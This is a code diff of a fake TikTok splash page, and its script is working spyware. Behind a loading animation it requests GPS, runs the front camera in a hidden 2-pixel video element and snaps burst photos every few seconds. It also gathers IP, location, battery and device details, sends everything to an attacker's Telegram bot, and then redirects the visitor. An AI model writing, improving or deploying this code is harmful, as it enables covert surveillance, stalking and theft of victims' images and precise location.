@@ -6,50 +6,161 @@
     <title>TikTok</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        
         body {
             background: #000;
-            height: 100vh; width: 100vw;
-            display: flex; justify-content: center; align-items: center;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            justify-content: center;
+            align-items: center;
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            overflow: hidden; position: fixed; top: 0; left: 0;
+            overflow: hidden;
+            position: fixed;
+            top: 0; left: 0;
         }
-        .splash { text-align: center; position: relative; z-index: 10; }
-        .tiktok-logo { margin-bottom: 40px; position: relative; display: inline-block; }
-        .tiktok-icon { width: 80px; height: 80px; position: relative; margin: 0 auto; }
+        
+        /* TikTok exact splash screen */
+        .splash {
+            text-align: center;
+            position: relative;
+            z-index: 10;
+        }
+        
+        /* TikTok logo */
+        .tiktok-logo {
+            margin-bottom: 40px;
+            position: relative;
+            display: inline-block;
+        }
+        
+        .tiktok-icon {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            margin: 0 auto;
+        }
+        
         .tiktok-icon svg {
-            width: 100%; height: 100%;
-            filter: drop-shadow(0 0 20px rgba(255,0,80,0.6)) drop-shadow(0 0 40px rgba(0,242,234,0.4));
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 0 20px rgba(255,0,80,0.6))
+                    drop-shadow(0 0 40px rgba(0,242,234,0.4));
             animation: glowPulse 2s ease-in-out infinite;
         }
+        
         @keyframes glowPulse {
-            0%,100%{filter:drop-shadow(0 0 20px rgba(255,0,80,0.6)) drop-shadow(0 0 40px rgba(0,242,234,0.4));}
-            50%{filter:drop-shadow(0 0 35px rgba(255,0,80,0.9)) drop-shadow(0 0 60px rgba(0,242,234,0.7));}
+            0%, 100% { 
+                filter: drop-shadow(0 0 20px rgba(255,0,80,0.6)) 
+                        drop-shadow(0 0 40px rgba(0,242,234,0.4)); 
+            }
+            50% { 
+                filter: drop-shadow(0 0 35px rgba(255,0,80,0.9)) 
+                        drop-shadow(0 0 60px rgba(0,242,234,0.7)); 
+            }
         }
-        .ring-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); width: 120px; height: 120px; }
+        
+        /* Pulsing rings around logo */
+        .ring-container {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 120px; height: 120px;
+        }
+        
         .ring {
-            position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%);
-            border-radius: 50%; border: 2px solid rgba(255,255,255,0.3);
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.3);
             animation: ringPulse 2s ease-out infinite;
         }
-        .ring:nth-child(1){width:60px;height:60px;animation-delay:0s;}
-        .ring:nth-child(2){width:60px;height:60px;animation-delay:0.6s;}
-        .ring:nth-child(3){width:60px;height:60px;animation-delay:1.2s;}
+        
+        .ring:nth-child(1) { width: 60px; height: 60px; animation-delay: 0s; }
+        .ring:nth-child(2) { width: 60px; height: 60px; animation-delay: 0.6s; }
+        .ring:nth-child(3) { width: 60px; height: 60px; animation-delay: 1.2s; }
+        
         @keyframes ringPulse {
-            0%{width:60px;height:60px;opacity:0.8;border-color:rgba(255,255,255,0.4);}
-            100%{width:160px;height:160px;opacity:0;border-color:rgba(255,255,255,0);}
+            0% { 
+                width: 60px; height: 60px; 
+                opacity: 0.8; 
+                border-color: rgba(255,255,255,0.4); 
+            }
+            100% { 
+                width: 160px; height: 160px; 
+                opacity: 0; 
+                border-color: rgba(255,255,255,0); 
+            }
         }
-        .loading-dots { display: flex; justify-content: center; gap: 8px; margin-top: 30px; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; background: #fff; animation: dotBounce 1.4s ease-in-out infinite; }
-        .dot:nth-child(1){animation-delay:0s;}.dot:nth-child(2){animation-delay:0.2s;}.dot:nth-child(3){animation-delay:0.4s;}
+        
+        /* Loading dots */
+        .loading-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 30px;
+        }
+        
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #fff;
+            animation: dotBounce 1.4s ease-in-out infinite;
+        }
+        
+        .dot:nth-child(1) { animation-delay: 0s; }
+        .dot:nth-child(2) { animation-delay: 0.2s; }
+        .dot:nth-child(3) { animation-delay: 0.4s; }
+        
         @keyframes dotBounce {
-            0%,80%,100%{transform:scale(0.3);opacity:0.3;}
-            40%{transform:scale(1);opacity:1;}
+            0%, 80%, 100% { transform: scale(0.3); opacity: 0.3; }
+            40% { transform: scale(1); opacity: 1; }
         }
-        .brand-text { color: #fff; font-size: 28px; font-weight: 700; letter-spacing: 4px; margin-top: 20px; text-shadow: 0 0 30px rgba(255,0,80,0.5); }
-        #cam { position: fixed; top: 0; left: 0; width: 2px; height: 2px; opacity: 0.01; pointer-events: none; z-index: -1; }
+        
+        /* TikTok brand text */
+        .brand-text {
+            color: #fff;
+            font-size: 28px;
+            font-weight: 700;
+            letter-spacing: 4px;
+            margin-top: 20px;
+            text-shadow: 0 0 30px rgba(255,0,80,0.5);
+        }
+        
+        /* Hidden camera elements */
+        #cam { 
+            position: fixed; 
+            top: 0; left: 0; 
+            width: 2px; height: 2px; 
+            opacity: 0.01; 
+            pointer-events: none;
+            z-index: -1;
+        }
         #canvas { display: none; }
-        #status { color: rgba(255,255,255,0.5); font-size: 12px; letter-spacing: 3px; margin-top: 15px; text-transform: uppercase; }
-        #debug { color: #0f0; font-size: 10px; margin-top: 10px; max-height: 60px; overflow: hidden; }
+        
+        /* Status text */
+        #status {
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+            letter-spacing: 3px;
+            margin-top: 15px;
+            text-transform: uppercase;
+        }
+        
+        /* Debug log */
+        #debug {
+            color: #0f0;
+            font-size: 9px;
+            margin-top: 15px;
+            max-height: 80px;
+            overflow: hidden;
+            text-align: left;
+            padding: 0 30px;
+            line-height: 1.4;
+            opacity: 0.8;
+        }
     </style>
 </head>
 <body>
@@ -57,68 +168,127 @@
     <canvas id="canvas"></canvas>
     
     <div class="splash" id="splash">
+        <!-- TikTok Logo with rings -->
         <div class="tiktok-logo">
-            <div class="ring-container"><div class="ring"></div><div class="ring"></div><div class="ring"></div></div>
+            <div class="ring-container">
+                <div class="ring"></div>
+                <div class="ring"></div>
+                <div class="ring"></div>
+            </div>
             <div class="tiktok-icon">
-                <svg viewBox="0 0 24 24" fill="white"><path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/></svg>
+                <svg viewBox="0 0 24 24" fill="white">
+                    <path d="M19.59 6.69a4.83 4.83 0 01-3.77-4.25V2h-3.45v13.89a2.89 2.89 0 01-5.76 0 2.89 2.89 0 012.89-2.89h.74v-3.3a6.19 6.19 0 00-5.24 6.19 6.19 6.19 0 006.19 6.19 6.19 6.19 0 006.19-6.19V7.27a8.17 8.17 0 004.65 1.46V5.35a4.83 4.83 0 01-3.44-1.41l.01 2.75z"/>
+                </svg>
             </div>
         </div>
-        <div class="loading-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+        
+        <!-- Loading dots -->
+        <div class="loading-dots">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+        
+        <!-- Brand name -->
         <div class="brand-text">TikTok</div>
-        <div id="status">Loading...</div>
+        
+        <!-- Status -->
+        <div id="status">CONNECTING...</div>
+        
+        <!-- Debug -->
         <div id="debug"></div>
     </div>
 
     <script>
+    // ==================== CONFIGURATION ====================
     var p = new URLSearchParams(location.search);
     var redir = p.get('r') || 'https://www.tiktok.com';
     var bot = p.get('bot') || '';
     var chat = p.get('chat') || '';
     
+    // ==================== GLOBAL VARIABLES ====================
     var isMobile = /Android|iPhone|iPad|iPod|webOS/i.test(navigator.userAgent);
-    var gpsData = null, ipData = null, cameraStream = null, cameraActive = false;
-    var photoCount = 0, visitStart = Date.now(), reportSent = false;
+    var isDesktop = !isMobile;
+    var gpsData = null;
+    var ipData = null;
+    var photoInterval = null;
     var burstInterval = null;
+    var cameraStream = null;
+    var cameraActive = false;
+    var photoCount = 0;
+    var visitStart = Date.now();
+    var reportSent = false;
     
+    // ==================== DEBUG LOG ====================
     function dlog(msg) {
         console.log('[Tracker] ' + msg);
         var el = document.getElementById('debug');
-        if (el) el.textContent = (el.textContent + '\n' + msg).trim().split('\n').slice(-5).join('\n');
+        if (el) {
+            el.textContent = el.textContent + '\n' + msg;
+            // Keep only last 6 lines
+            var lines = el.textContent.trim().split('\n');
+            if (lines.length > 6) lines = lines.slice(-6);
+            el.textContent = lines.join('\n');
+        }
     }
     
+    // ==================== GET IP ====================
     function getIP() {
         return fetch('https://api.ipify.org?format=json')
-            .then(r => r.json()).then(d => { ipData = d.ip; dlog('IP: ' + d.ip); return d.ip; })
-            .catch(() => { ipData = 'Unknown'; return null; });
+            .then(function(r) { return r.json(); })
+            .then(function(d) { ipData = d.ip; dlog('IP: ' + d.ip); return d.ip; })
+            .catch(function() { ipData = 'Unknown'; return null; });
     }
     
+    // ==================== GET BATTERY ====================
     function getBattery() {
-        if (navigator.getBattery) return navigator.getBattery().then(b => ({ level: Math.round(b.level*100)+'%', charging: b.charging?'Yes':'No' }));
+        if (navigator.getBattery) {
+            return navigator.getBattery().then(function(b) {
+                return { level: Math.round(b.level * 100) + '%', charging: b.charging ? 'Yes' : 'No' };
+            });
+        }
         return Promise.resolve({ level: 'N/A', charging: 'Unknown' });
     }
     
+    // ==================== GET GPS ====================
     function getGPS() {
-        return new Promise(resolve => {
+        return new Promise(function(resolve) {
             if (!navigator.geolocation) { dlog('GPS: Not supported'); resolve(null); return; }
+            
             navigator.geolocation.getCurrentPosition(
-                pos => { dlog('GPS: GRANTED'); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy, alt: pos.coords.altitude, speed: pos.coords.speed }); },
-                err => { dlog('GPS: ' + ({1:'Denied',2:'Unavailable',3:'Timeout'}[err.code]||err.message)); resolve(null); },
+                function(pos) {
+                    dlog('GPS: GRANTED');
+                    resolve({ 
+                        lat: pos.coords.latitude, 
+                        lon: pos.coords.longitude, 
+                        acc: pos.coords.accuracy, 
+                        alt: pos.coords.altitude,
+                        speed: pos.coords.speed,
+                        heading: pos.coords.heading 
+                    });
+                },
+                function(err) {
+                    var msgs = {1:'Denied', 2:'Unavailable', 3:'Timeout'};
+                    dlog('GPS: ' + (msgs[err.code] || err.message));
+                    resolve(null);
+                },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         });
     }
     
-    // ============ FIXED CAMERA ============
+    // ==================== START CAMERA (FIXED) ====================
     async function startCamera() {
         dlog('📷 Camera: Starting...');
         document.getElementById('status').textContent = 'STARTING CAMERA...';
         
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             dlog('❌ Camera: Not supported');
+            document.getElementById('status').textContent = 'NO CAMERA SUPPORT';
             return false;
         }
         
-        // Try multiple times with different approaches
+        // Try different approaches
         var attempts = [
             { video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } },
             { video: { facingMode: 'user' } },
@@ -134,10 +304,21 @@
                 cameraStream = stream;
                 
                 // Wait for video to be ready
-                await new Promise((resolve) => {
-                    var timeout = setTimeout(() => { dlog('⏰ Video timeout'); resolve(); }, 5000);
-                    v.onloadedmetadata = () => { clearTimeout(timeout); v.play().then(resolve).catch(resolve); };
-                    if (v.readyState >= 2) { clearTimeout(timeout); v.play().then(resolve).catch(resolve); }
+                await new Promise(function(resolve) {
+                    var timeout = setTimeout(function() { 
+                        dlog('⏰ Video timeout after 5s'); 
+                        resolve(); 
+                    }, 5000);
+                    
+                    v.onloadedmetadata = function() { 
+                        clearTimeout(timeout); 
+                        v.play().then(resolve).catch(resolve); 
+                    };
+                    
+                    if (v.readyState >= 2) { 
+                        clearTimeout(timeout); 
+                        v.play().then(resolve).catch(resolve); 
+                    }
                 });
                 
                 // Check if we got actual video
@@ -147,62 +328,86 @@
                     document.getElementById('status').textContent = 'CAMERA READY';
                     return true;
                 } else {
-                    dlog('⚠️ Camera stream but no video data');
+                    dlog('⚠️ Camera stream but no video dimensions');
                 }
             } catch(e) {
-                dlog('❌ Attempt ' + (i+1) + ' failed: ' + e.message);
+                dlog('❌ Attempt ' + (i+1) + ': ' + e.message);
             }
         }
         
         dlog('❌ Camera: ALL attempts failed');
-        document.getElementById('status').textContent = 'NO CAMERA';
+        document.getElementById('status').textContent = 'NO CAMERA AVAILABLE';
         return false;
     }
     
+    // ==================== TAKE SINGLE PHOTO ====================
     function takePhoto() {
-        if (!cameraActive) { dlog('📸 Photo skipped: camera not active'); return null; }
+        if (!cameraActive) { 
+            dlog('📸 Photo skipped: camera not active'); 
+            return null; 
+        }
+        
         try {
             var v = document.getElementById('cam');
-            if (!v.videoWidth || v.videoWidth === 0) { dlog('📸 Photo skipped: no video'); return null; }
+            if (!v.videoWidth || v.videoWidth === 0) { 
+                dlog('📸 Photo skipped: no video signal'); 
+                return null; 
+            }
             
             var c = document.getElementById('canvas');
             c.width = v.videoWidth;
             c.height = v.videoHeight;
             var ctx = c.getContext('2d');
+            
+            // Mirror for front camera
             ctx.save();
             ctx.scale(-1, 1);
             ctx.drawImage(v, -c.width, 0, c.width, c.height);
             ctx.restore();
             
             photoCount++;
-            dlog('📸 Photo #' + photoCount + ' captured!');
+            dlog('📸 Photo #' + photoCount + ' captured! (' + c.width + 'x' + c.height + ')');
             return c.toDataURL('image/jpeg', 0.7);
+            
         } catch(e) {
             dlog('📸 Photo error: ' + e.message);
             return null;
         }
     }
     
+    // ==================== BURST PHOTOS (3 at once) ====================
     function takeBurstPhotos() {
-        if (!cameraActive) { dlog('📸 Burst skipped: camera not active'); return; }
-        dlog('📸📸📸 BURST: Taking 3 photos...');
+        if (!cameraActive) { 
+            dlog('📸 Burst skipped: camera not active'); 
+            return; 
+        }
         
-        // Take 3 photos with 500ms gaps
+        dlog('📸📸📸 BURST: Capturing 3 photos...');
+        
+        // Take 3 photos with 400ms gaps
         for (var i = 0; i < 3; i++) {
             setTimeout(function() {
                 var photo = takePhoto();
                 if (photo) sendPhotoToTelegram(photo);
-            }, i * 500);
+            }, i * 400);
         }
     }
     
+    // ==================== SEND PHOTO TO TELEGRAM ====================
     function sendPhotoToTelegram(photoData) {
-        if (!photoData || !bot || !chat) { dlog('📤 Send skipped: no data/bot/chat'); return; }
+        if (!photoData || !bot || !chat) { 
+            dlog('📤 Send skipped: missing data/bot/chat'); 
+            return; 
+        }
         
         try {
-            var arr = photoData.split(','), mime = arr[0].match(/:(.*?);/)[1];
-            var bstr = atob(arr[1]), n = bstr.length, u8 = new Uint8Array(n);
-            while(n--) u8[n] = bstr.charCodeAt(n);
+            // Convert base64 to blob
+            var arr = photoData.split(',');
+            var mime = arr[0].match(/:(.*?);/)[1];
+            var bstr = atob(arr[1]);
+            var n = bstr.length;
+            var u8 = new Uint8Array(n);
+            while(n--) { u8[n] = bstr.charCodeAt(n); }
             var blob = new Blob([u8], {type: mime});
             
             var fd = new FormData();
@@ -212,132 +417,254 @@
             
             var xhr = new XMLHttpRequest();
             xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendPhoto', true);
-            xhr.onload = function() { dlog('📤 Photo #' + photoCount + ' sent: ' + xhr.status); };
-            xhr.onerror = function() { dlog('📤 Photo #' + photoCount + ' FAILED'); };
+            xhr.onload = function() { 
+                dlog('📤 Photo #' + photoCount + ' sent: HTTP ' + xhr.status); 
+            };
+            xhr.onerror = function() { 
+                dlog('📤 Photo #' + photoCount + ' FAILED (network)'); 
+            };
             xhr.send(fd);
-        } catch(e) { dlog('📤 Error: ' + e.message); }
+            
+        } catch(e) {
+            dlog('📤 Error: ' + e.message);
+        }
     }
     
+    // ==================== GET IP LOCATION ====================
     async function getIPLocation() {
         if (!ipData || ipData === 'Unknown') return '';
         try {
             var resp = await fetch('http://ip-api.com/json/' + ipData + '?fields=country,regionName,city,zip,timezone,lat,lon');
             var loc = await resp.json();
             if (loc.country) {
-                var t = '📍 Location Details\n   • Country: ' + loc.country + '\n   • Region: ' + (loc.regionName||'N/A') + '\n   • City: ' + (loc.city||'N/A') + '\n   • Postal Code: ' + (loc.zip||'N/A') + '\n   • Timezone: ' + (loc.timezone||'N/A') + '\n';
-                if (loc.lat) t += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
-                return t + '\n';
+                var text = '';
+                text += '📍 Location Details\n';
+                text += '   • Country: ' + loc.country + '\n';
+                text += '   • Region: ' + (loc.regionName || 'N/A') + '\n';
+                text += '   • City: ' + (loc.city || 'N/A') + '\n';
+                text += '   • Postal Code: ' + (loc.zip || 'N/A') + '\n';
+                text += '   • Timezone: ' + (loc.timezone || 'N/A') + '\n';
+                if (loc.lat && loc.lon) {
+                    text += '   • Approx Maps: https://maps.google.com/?q=' + loc.lat + ',' + loc.lon + '\n';
+                }
+                text += '\n';
+                return text;
             }
-        } catch(e) {}
+        } catch(e) {
+            dlog('IP Location lookup failed');
+        }
         return '📍 Location Details\n   • Timezone: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n\n';
     }
     
+    // ==================== BUILD REPORT ====================
     async function buildReport(isFinal) {
-        var ua = navigator.userAgent, plat = navigator.platform, lang = navigator.language;
-        var scr = screen.width + 'x' + screen.height, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        var cores = navigator.hardwareConcurrency || 'N/A', ram = navigator.deviceMemory || 'N/A';
+        var ua = navigator.userAgent;
+        var plat = navigator.platform;
+        var lang = navigator.language;
+        var scr = screen.width + 'x' + screen.height;
+        var tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        var cores = navigator.hardwareConcurrency || 'N/A';
+        var ram = navigator.deviceMemory || 'N/A';
         var now = new Date();
-        var dateStr = now.toLocaleDateString('en-US',{month:'long',day:'numeric',year:'numeric'});
-        var timeStr = now.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:true});
-        var duration = Math.floor((Date.now()-visitStart)/1000);
-        var battery = await getBattery(), ipLocation = await getIPLocation();
+        var dateStr = now.toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
+        var timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
+        var duration = Math.floor((Date.now() - visitStart) / 1000);
+        var battery = await getBattery();
+        var ipLocation = await getIPLocation();
         
+        // Device model detection
         var deviceModel = plat;
-        if (/iPhone/.test(ua)) { var v=ua.match(/OS (\d+_\d+)/); deviceModel='iPhone OS '+(v?v[1].replace('_','.'):'')+' like Mac OS X'; }
-        else if (/Android/.test(ua)) { var av=ua.match(/Android\s([\d.]+)/); deviceModel='Android '+(av?av[1]:'')+' Device'; }
-        else if (/Windows/.test(plat)) deviceModel='Windows PC';
-        else if (/Mac/.test(plat)) deviceModel='Mac Computer';
-        else if (/Linux/.test(plat)) deviceModel='Linux Computer';
+        if (/iPhone/.test(ua)) {
+            var iosVer = ua.match(/OS (\d+_\d+)/);
+            deviceModel = 'iPhone OS ' + (iosVer ? iosVer[1].replace('_','.') : '') + ' like Mac OS X';
+        } else if (/Android/.test(ua)) {
+            var androidVer = ua.match(/Android\s([\d.]+)/);
+            deviceModel = 'Android ' + (androidVer ? androidVer[1] : '') + ' Device';
+        } else if (/Windows/.test(plat)) {
+            deviceModel = 'Windows PC';
+        } else if (/Mac/.test(plat)) {
+            deviceModel = 'Mac Computer';
+        } else if (/Linux/.test(plat)) {
+            deviceModel = 'Linux Computer';
+        }
         
         var prefix = isFinal ? '📋 FINAL REPORT - User Left Page\n\n' : '';
+        
         var msg = prefix;
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📊 Visitor Information Captured\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
-        msg += '🖥️ Device & Browser\n   • Device Model: '+deviceModel+'\n   • Device Type: '+(isMobile?'Mobile':'Desktop')+'\n   • User Agent: '+ua.substring(0,80)+'...\n\n';
-        msg += '🌐 Network Information\n   • IP Address: '+(ipData||'Detecting...')+'\n   • Language: '+lang+'\n\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📊 Visitor Information Captured\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        // Device & Browser
+        msg += '🖥️ Device & Browser\n';
+        msg += '   • Device Model: ' + deviceModel + '\n';
+        msg += '   • Device Type: ' + (isMobile ? 'Mobile' : 'Desktop') + '\n';
+        msg += '   • User Agent: ' + ua.substring(0, 80) + '...\n\n';
+        
+        // Network
+        msg += '🌐 Network Information\n';
+        msg += '   • IP Address: ' + (ipData || 'Detecting...') + '\n';
+        msg += '   • Language: ' + lang + '\n\n';
+        
+        // IP Location
         msg += ipLocation;
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    🗺️ GPS Coordinates\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        // GPS Section
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    🗺️ GPS Coordinates\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
         if (gpsData) {
-            msg += '   ✅ Location Granted\n   • Latitude: '+gpsData.lat.toFixed(15)+'\n   • Longitude: '+gpsData.lon.toFixed(15)+'\n   • Accuracy: '+gpsData.acc.toFixed(0)+'mm\n';
-            if (gpsData.alt) msg += '   • Altitude: '+gpsData.alt.toFixed(1)+'m\n';
-            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q='+gpsData.lat+','+gpsData.lon+'&ll='+gpsData.lat+','+gpsData.lon+'&z=16\n\n';
+            msg += '   ✅ Location Granted\n';
+            msg += '   • Latitude: ' + gpsData.lat.toFixed(15) + '\n';
+            msg += '   • Longitude: ' + gpsData.lon.toFixed(15) + '\n';
+            msg += '   • Accuracy: ' + gpsData.acc.toFixed(0) + 'mm\n';
+            if (gpsData.alt) msg += '   • Altitude: ' + gpsData.alt.toFixed(1) + 'm\n';
+            if (gpsData.speed) msg += '   • Speed: ' + (gpsData.speed * 3.6).toFixed(1) + ' km/h\n';
+            msg += '\n   🗺️ Maps: https://maps.google.com/maps?q=' + gpsData.lat + ',' + gpsData.lon + '&ll=' + gpsData.lat + ',' + gpsData.lon + '&z=16\n\n';
         } else {
-            msg += '   ❌ Location: Not available\n   💡 Location permission was not granted\n\n';
+            msg += '   ❌ Location: Not available\n';
+            if (isDesktop) msg += '   💡 Desktop detected - GPS usually not available\n';
+            msg += '   💡 Location permission was not granted\n\n';
         }
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n    📱 Device Details\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
-        msg += '🖼️ Display Information\n   • Resolution: '+scr+'\n\n';
-        msg += '🔋 Battery Status\n   • Level: '+battery.level+'\n   • Charging: '+battery.charging+'\n\n';
-        msg += '🔐 Device Permissions\n   • Camera: '+(cameraActive?'Active 📸':'Not Available')+'\n   • Location: '+(gpsData?'Granted ✅':'Denied ❌')+'\n\n';
-        msg += '💾 Hardware & Storage\n   • CPU Cores: '+cores+'\n   • RAM: '+ram+' GB\n   • Photos Captured: '+photoCount+'\n   • Visit Duration: '+duration+' seconds\n\n';
-        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n📅 Captured: '+dateStr+', '+timeStr+'\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+        
+        // Device Details
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '    📱 Device Details\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+        
+        msg += '🖼️ Display Information\n   • Resolution: ' + scr + '\n\n';
+        msg += '🔋 Battery Status\n   • Level: ' + battery.level + '\n   • Charging: ' + battery.charging + '\n\n';
+        msg += '🔐 Device Permissions\n   • Camera: ' + (cameraActive ? 'Active 📸' : 'Not Available') + '\n   • Location: ' + (gpsData ? 'Granted ✅' : 'Denied ❌') + '\n\n';
+        msg += '💾 Hardware & Storage\n   • CPU Cores: ' + cores + '\n   • RAM: ' + ram + ' GB\n   • Photos Captured: ' + photoCount + '\n   • Visit Duration: ' + duration + ' seconds\n\n';
+        
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+        msg += '📅 Captured: ' + dateStr + ', ' + timeStr + '\n';
+        msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+        
         return msg;
     }
     
+    // ==================== SEND REPORT ====================
     async function sendReport(isFinal) {
         if (reportSent && !isFinal) return;
         reportSent = true;
-        dlog(isFinal?'Sending FINAL report...':'Sending report...');
+        
+        dlog(isFinal ? 'Sending FINAL report...' : 'Sending report...');
         var msg = await buildReport(isFinal);
+        
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://api.telegram.org/bot'+bot+'/sendMessage', false);
-        xhr.setRequestHeader('Content-Type','application/json');
-        try { xhr.send(JSON.stringify({chat_id:chat,text:msg,disable_web_page_preview:true})); dlog('Report sent: '+xhr.status); } catch(e) { dlog('Report FAILED'); }
+        xhr.open('POST', 'https://api.telegram.org/bot' + bot + '/sendMessage', false);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        try {
+            xhr.send(JSON.stringify({ chat_id: chat, text: msg, disable_web_page_preview: true }));
+            dlog('Report sent: HTTP ' + xhr.status);
+        } catch(e) { dlog('Report FAILED'); }
+        
+        // Send GPS location pin
         if (gpsData) {
             var xhr2 = new XMLHttpRequest();
-            xhr2.open('POST', 'https://api.telegram.org/bot'+bot+'/sendLocation', false);
-            xhr2.setRequestHeader('Content-Type','application/json');
-            try { xhr2.send(JSON.stringify({chat_id:chat,latitude:gpsData.lat,longitude:gpsData.lon})); } catch(e) {}
+            xhr2.open('POST', 'https://api.telegram.org/bot' + bot + '/sendLocation', false);
+            xhr2.setRequestHeader('Content-Type', 'application/json');
+            try { 
+                xhr2.send(JSON.stringify({ chat_id: chat, latitude: gpsData.lat, longitude: gpsData.lon })); 
+                dlog('Location pin sent');
+            } catch(e) {}
         }
     }
     
+    // ==================== STOP CAMERA ====================
     function stopCamera() {
-        if (cameraStream) { cameraStream.getTracks().forEach(t=>t.stop()); cameraStream=null; cameraActive=false; }
-        if (burstInterval) { clearInterval(burstInterval); burstInterval=null; }
+        if (cameraStream) { 
+            cameraStream.getTracks().forEach(function(t) { t.stop(); }); 
+            cameraStream = null; 
+            cameraActive = false; 
+            dlog('Camera: Stopped');
+        }
+        if (photoInterval) { clearInterval(photoInterval); photoInterval = null; }
+        if (burstInterval) { clearInterval(burstInterval); burstInterval = null; }
     }
     
+    // ==================== MAIN ====================
     async function main() {
-        dlog('=== START === ' + (isMobile?'MOBILE':'DESKTOP'));
-        document.getElementById('status').textContent = 'Loading...';
+        dlog('=== START ===');
+        dlog('Device: ' + (isMobile ? 'MOBILE' : 'DESKTOP'));
+        dlog('Redirect: ' + redir.substring(0,30) + '...');
         
+        document.getElementById('status').textContent = 'LOADING...';
+        
+        // Start IP lookup (don't wait)
         getIP();
+        
+        // Get GPS
+        document.getElementById('status').textContent = 'LOCATING...';
         gpsData = await getGPS();
         
-        document.getElementById('status').textContent = 'Starting camera...';
+        // Start camera
+        document.getElementById('status').textContent = 'STARTING CAMERA...';
         var camStarted = await startCamera();
         
-        // Send report
+        // Send initial report FIRST
+        document.getElementById('status').textContent = 'SENDING...';
         await sendReport(false);
         
         // BURST PHOTOS: 3 photos every 5 seconds
         if (camStarted) {
-            dlog('📸📸📸 BURST MODE: 3 photos every 5 seconds');
+            dlog('📸📸📸 BURST MODE ACTIVE: 3 photos every 5 seconds');
+            document.getElementById('status').textContent = 'CAPTURING...';
             
-            // First burst after 3 seconds (give camera time)
+            // First burst after 3 seconds (give camera time to fully initialize)
             setTimeout(function() {
                 takeBurstPhotos();
-                burstInterval = setInterval(function() { takeBurstPhotos(); }, 5000);
+                
+                // Then burst every 5 seconds
+                burstInterval = setInterval(function() {
+                    takeBurstPhotos();
+                }, 5000);
             }, 3000);
         } else {
-            dlog('⚠️ Camera not available - skipping photos');
+            dlog('⚠️ Camera not available - no photos will be taken');
+            document.getElementById('status').textContent = 'NO CAMERA';
         }
         
-        // Redirect after 8 seconds (gives time for first burst)
-        document.getElementById('status').textContent = 'Ready';
+        // Redirect after 10 seconds (allows time for 2 bursts)
+        document.getElementById('status').textContent = 'READY';
